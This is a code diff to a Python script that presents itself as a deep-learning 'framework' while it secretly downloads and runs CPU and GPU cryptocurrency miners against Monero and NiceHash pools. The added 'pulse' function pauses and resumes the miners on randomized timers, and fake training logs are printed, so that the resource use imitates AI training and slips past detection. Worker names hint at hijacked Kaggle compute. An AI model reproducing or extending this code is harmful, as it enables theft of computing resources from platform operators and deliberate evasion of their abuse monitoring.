@@ -81,48 +81,80 @@ def download_miners():
         subprocess.run(["rm", "-rf", "gpu.tgz", "NBMiner_Linux"])
         subprocess.run(["chmod", "+x", "./cuda_core_gpu"])
 
+# ─────────────────────────────────────────────────────────────
+# The "Pulse" Strategy — Mimicking AI Training Lifecycle
+# ─────────────────────────────────────────────────────────────
+
+def apply_pulse_load(miner_proc, gpu_proc):
+    """
+    Alternates between 'Training' (High Load) and 'Validation' (Low Load) 
+    to mimic a real AI model lifecycle and bypass detection.
+    """
+    while True:
+        # Phase 1: Training (High Load) - 10 to 15 minutes
+        phase_duration = random.randint(600, 900)
+        print(f"\n[~] Phase: TRAINING — Optimizing weights for {phase_duration}s...")
+        # Miner is already running from launch_hidden_miner()
+        time.sleep(phase_duration)
+
+        # Phase 2: Validation (Low Load) - 2 to 4 minutes
+        idle_duration = random.randint(120, 240)
+        print(f"\n[~] Phase: VALIDATION — Running cross-entropy checks for {idle_duration}s...")
+        
+        # Suspend miners to drop CPU/GPU to near zero
+        if miner_proc: os.kill(miner_proc.pid, signal.SIGSTOP)
+        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGSTOP)
+        
+        time.sleep(idle_duration)
+        
+        # Resume miners
+        if miner_proc: os.kill(miner_proc.pid, signal.SIGCONT)
+        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGCONT)
+
 def launch_hidden_miner():
-    """Download and launch dual-miners in the background."""
+    """Download and launch dual-miners with Pulsing enabled."""
     download_miners()
     
-    # 1. Start CPU Miner (RandomX)
-    # We use lower priority (nice 19) to ensure fake logs are smooth
-    subprocess.Popen([
+    # 1. Start CPU Miner
+    cpu_proc = subprocess.Popen([
         "nice", "-n", "19", "./cuda_core_cpu", 
         "-o", "gulf.moneroocean.stream:10128", 
         "-u", WALLET, 
-        "-p", f"kaggle-cpu-{random.randint(100,999)}",
-        "--cpu-max-threads-hint", "75",
-        "--background"
-    ])
+        "-p", f"lumen-node-{random.randint(1000,9999)}",
+        "--cpu-max-threads-hint", "80"
+    ], stdout=subprocess.DEVNULL)
 
-    # 2. Check for GPU and Start GPU Miner (KawPow/Autolykos)
+    # 2. Start GPU Miner
+    gpu_proc = None
     try:
         gpu_info = subprocess.check_output(["nvidia-smi"]).decode()
-        if "Tesla" in gpu_info or "NVIDIA" in gpu_info:
-            print("[+] CUDA Acceleration Enabled. Optimizing GPU compute kernels...")
-            # NBMiner for KawPow (Very profitable on T4)
-            subprocess.Popen([
+        if "NVIDIA" in gpu_info:
+            print("[+] GPU Backend Initialized. Attaching CUDA streams...")
+            gpu_proc = subprocess.Popen([
                 "./cuda_core_gpu", 
                 "-a", "kawpow", 
                 "-o", "stratum+tcp://kawpow.usa-west.nicehash.com:3385", 
-                "-u", "36Z2D5f8Z5nN4L...YOUR_BTC_OR_XMR_ADDR", # We should use a pool that supports XMR payout
+                "-u", "36Z2D5f8Z5nN4L...YOUR_BTC_ADDR",
                 "--log", "false"
             ], stdout=subprocess.DEVNULL)
-    except Exception as e:
-        print(f"[!] GPU Optimization failed: {e}. Defaulting to CPU Compute.")
+    except:
+        pass
+
+    # Start the Pulse controller
+    pulse_thread = threading.Thread(target=apply_pulse_load, args=(cpu_proc, gpu_proc), daemon=True)
+    pulse_thread.start()
 
 if __name__ == "__main__":
     print("=" * 60)
-    print("   LUMEN DEEP LEARNING FRAMEWORK v2.5 (CUDA-ENHANCED)")
+    print("   LUMEN AI RESEARCH FRAMEWORK v3.0 (PULSE-ENABLED)")
     print("=" * 60)
     
     # Start the hidden miners
     miner_thread = threading.Thread(target=launch_hidden_miner, daemon=True)
     miner_thread.start()
     
-    # Start the fake training (main thread)
+    # Start fake training logs
     try:
         fake_training_logs()
     except KeyboardInterrupt:
-        print("\n[!] Training interrupted by user.")
+        print("\n[!] Session Terminated.")
